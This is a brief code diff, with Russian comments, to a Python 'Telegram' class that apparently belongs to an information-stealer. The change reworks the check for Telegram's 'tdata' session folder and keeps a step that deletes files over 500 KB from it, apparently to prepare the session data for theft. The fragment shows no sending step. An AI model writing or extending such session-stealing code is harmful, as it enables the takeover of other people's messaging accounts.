@@ -164,15 +164,10 @@ class Telegram:
 				break
 			except: pass
 		
-		try:
-			if os.listdir(tg_path) == []:  # если нет данных в папке tdata завершит работу
-				shutil.rmtree(tg_path)
-				Support.send_error("Telegram")
-				return False
-		except:
+		if not os.path.exists(tg_path): # если нет папки -> завершение процесса
 			Support.send_error("Telegram")
 			return False
-			
+		
 		try:
 			# удаляем ненужные файлы размером больше 500кб
 			listdir = os.listdir(tg_path)
